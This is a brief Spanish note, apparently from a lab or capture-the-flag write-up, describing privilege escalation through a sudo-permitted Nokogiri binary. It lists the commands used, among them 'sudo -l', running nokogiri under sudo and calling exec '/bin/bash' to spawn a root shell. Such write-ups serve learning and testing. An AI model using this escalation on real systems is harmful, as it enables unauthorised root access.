Nokogiri es una biblioteca de software de código abierto para analizar HTML y XML en Ruby.

```
sudo -l
```

![[Pasted image 20250716123758.png]]

Como este progama está escrito en ruby, y en uno de sus parametros permite la ejecución de comandos.

```
touch index.html
sudo /usr/bin/nokogiri index.html
//Ahora debemos ejecutar una bash en ruby
exec "/bin/bash"
```

![[Pasted image 20250716124253.png]]
